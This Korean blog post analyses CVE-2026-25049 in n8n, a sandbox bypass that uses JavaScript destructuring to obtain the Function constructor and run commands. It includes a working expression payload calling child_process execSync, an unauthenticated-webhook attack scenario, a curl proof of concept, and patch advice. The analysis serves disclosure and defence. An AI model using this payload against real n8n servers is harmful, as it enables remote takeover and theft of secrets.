---
title: "N8N RCE 취약점(CVE-2026-25049) 심층 분석: 자바스크립트 구조 분해 할당을 이용한 샌드박스 우회"
date: 2026-02-05T17:20:00+09:00
description: "n8n의 5중 보안 레이어를 단 한 줄의 자바스크립트 문법(Destructuring)으로 무력화시킨 CVE-2026-25049 취약점의 원인과 익스플로잇 코드를 상세 분석합니다."
categories: ["Security", "Vulnerability Analysis", "Web Hacking"]
tags: ["CVE-2026-25049", "n8n", "RCE", "JavaScript", "Sandbox Bypass", "Node.js"]
author: "arang"
---

최근 워크플로우 자동화 플랫폼인 **n8n**에서 치명적인 원격 코드 실행(RCE) 취약점(**CVE-2026-25049**)이 발견되었습니다. CVSS 점수 **9.4 (Critical)**를 기록한 이 취약점은 인증되지 않은 공격자가 공개된 Webhook을 통해 서버를 완전히 장악할 수 있게 만듭니다.

특히 이 취약점은 n8n이 구축해 둔 정규표현식, AST 검사, 런타임 검증 등 **5단계의 보안 레이어**를 자바스크립트의 **구조 분해 할당(Destructuring Assignment)**이라는 문법적 특성을 이용해 우회했다는 점에서 기술적으로 매우 흥미롭습니다.

이번 글에서는 해당 취약점이 어떻게 발생했는지 코드 레벨에서 분석하고, PoC(Proof of Concept)를 통해 공격 원리를 살펴보겠습니다.

<!--more-->

## 1. 배경: n8n의 샌드박스 방어 체계

n8n은 사용자가 자바스크립트 표현식(Expression)을 사용하여 데이터를 처리할 수 있는 기능을 제공합니다. 예를 들어 `{{ $json.name }}`과 같은 식을 내부적으로 `eval()`이나 `Function` 생성자와 유사한 방식으로 실행합니다.

당연히 이는 보안상 위험하기 때문에, n8n은 다음과 같은 다중 방어막을 구축해 두었습니다.

1.  **Regex Check**: `.constructor`와 같은 위험한 키워드가 포함된 문자열 차단
2.  **AST Sanitizer**: 코드의 구조(AST)를 분석하여 위험한 노드(MemberExpression 등) 차단
3.  **Runtime Validator**: 실행 시점에 객체 속성 접근 검사
4.  **Function Sanitizer**: 일반 함수에서 `this` 컨텍스트를 빈 객체로 바인딩
5.  **Property Removal**: `eval`, `Function` 등 위험한 전역 객체 제거

언뜻 보면 완벽해 보이는 방어 체계입니다. 하지만 이 모든 방어막이 **"객체 속성 접근은 점(.)이나 대괄호([])를 통해서만 이루어진다"**는 잘못된 가정 위에 세워져 있었습니다.

## 2. 취약점 원인: 구조 분해 할당 (Destructuring)

자바스크립트에서 객체의 속성을 가져오는 방법은 크게 두 가지가 있습니다.

### A. 전통적인 방식 (차단됨)
```javascript
obj.constructor      // Dot notation
obj['constructor']   // Bracket notation
```
이 방식들은 AST(Abstract Syntax Tree) 상에서 `MemberExpression` 노드로 파싱됩니다. n8n의 AST Sanitizer는 이 노드를 감시하고 있었고, 정규식 필터도 `.constructor` 패턴을 잡아냈습니다.

### B. 구조 분해 할당 (우회 성공)
```javascript
const { constructor } = obj;
```
ES6부터 도입된 구조 분해 할당 문법입니다. 이 코드는 AST 상에서 `VariableDeclaration` 내의 **`ObjectPattern`**으로 파싱됩니다.

**문제는 n8n의 보안 로직이 `MemberExpression`만 검사하고 `ObjectPattern`은 검사하지 않았다는 점입니다.** 또한, 소스 코드 텍스트 상으로도 `.constructor`라는 패턴이 나타나지 않아 정규식 필터도 우회할 수 있었습니다.

## 3. Exploit Chain 분석

단순히 `constructor`를 가져오는 것만으로는 부족합니다. 공격자는 이를 이용해 임의의 코드를 실행해야 합니다. 전체 익스플로잇 체인은 다음과 같습니다.

### 단계 1: 화살표 함수로 `this` 확보
n8n은 일반 함수(`function() {}`)의 `this`를 빈 객체로 강제 바인딩하여 샌드박싱합니다. 하지만 **화살표 함수(`() => {}`)**는 자신만의 `this` 바인딩을 가지지 않고, 상위 스코프(Lexical Scope)의 `this`를 그대로 사용합니다.

```javascript
(() => {
    // 샌드박스 처리되지 않은 원본 'this' 또는 문맥에 접근 가능
})()
```

### 단계 2: 구조 분해로 `Function` 생성자 획득
화살표 함수 내부에서 빈 함수의 `constructor`를 구조 분해 할당으로 가져옵니다. 자바스크립트에서 모든 함수의 생성자는 `Function` 객체입니다. 즉, `Function` 생성자를 얻어내는 것입니다.

```javascript
const { constructor } = () => {}; 
// constructor === Function
```

### 단계 3: 임의 코드 실행
획득한 `Function` 생성자를 이용해 문자열로 된 코드를 실행할 수 있는 함수를 만들고, 이를 즉시 실행합니다.

```javascript
constructor('return process.mainModule.require("child_process").execSync("id").toString()')()
```

### 최종 Payload
이 모든 것을 합치면 다음과 같은 한 줄의 페이로드가 완성됩니다.

```javascript
={{(() => { 
    const {constructor} = ()=>{}; 
    return constructor('return process.mainModule.require("child_process").execSync("id").toString()')(); 
})()}}
```

## 4. PoC 및 공격 시나리오

이 취약점은 n8n의 **Webhook** 기능과 결합될 때 파급력이 극대화됩니다. n8n에서는 인증 없는(Authentication: None) Webhook을 쉽게 만들 수 있기 때문입니다.

### 공격 시나리오
1.  공격자가 n8n 인스턴스에 접속 (또는 CSRF 등으로 유도)하여 악성 워크플로우 생성.
2.  Webhook 노드를 추가하고 인증을 `None`으로 설정.
3.  Webhook 뒤에 연결된 노드(Set 등)의 표현식 필드에 위의 RCE 페이로드를 삽입.
4.  워크플로우 활성화.
5.  외부에서 해당 Webhook URL로 요청을 보내면 서버에서 명령어가 실행됨.

### 실제 테스트 (PoC)

```bash
# Webhook으로 요청 전송
curl -X POST 'http://target-n8n-server.com/webhook/rce-demo' \
 -H 'Content-Type: application/json' \
 --data '{}'
```

**응답 결과:**
```json
{
 "result": "uid=0(root) gid=0(root) groups=0(root)\n"
}
```
서버의 `id` 명령어가 실행되어 root 권한임을 확인할 수 있습니다. 공격자는 이를 통해 환경변수(API Key) 탈취, 백도어 설치, 내부망 침투 등 모든 행위를 할 수 있게 됩니다.

## 5. 대응 및 패치

### 패치 버전
n8n 팀은 이 문제를 확인하고 즉시 패치를 배포했습니다.
*   **해결된 버전:** `1.123.17`, `2.5.2` 이상

### 근본적인 해결책
개발자 관점에서 이 취약점은 **"블랙리스트 기반 보안의 한계"**를 보여줍니다. 자바스크립트는 너무나 유연한 언어이기 때문에, 특정 문법(점 표기법 등)만 막아서는 우회 가능성이 항상 존재합니다.

*   **Regex에 의존하지 말 것:** 코드는 파서로 분석해야지, 정규식으로 분석하면 안 됩니다.
*   **AST 커버리지 확대:** `MemberExpression`뿐만 아니라 `ObjectPattern` 등 속성 접근이 가능한 모든 AST 노드를 검사해야 합니다.
*   **Allowlist 적용:** 가능하다면 허용된 속성만 접근하도록 화이트리스트 방식을 사용하는 것이 안전합니다.

## 마치며

이번 CVE-2026-25049는 5겹의 방어막이 있어도 단 하나의 논리적 맹점(Destructuring 간과)으로 인해 전체 보안이 무너질 수 있음을 보여주는 교과서적인 사례입니다. n8n을 사용 중이라면 즉시 최신 버전으로 업데이트하시기 바랍니다.

---
*Reference: [SecureLayer7 Deep Dive](https://blog.securelayer7.net/cve-2026-25049/)*
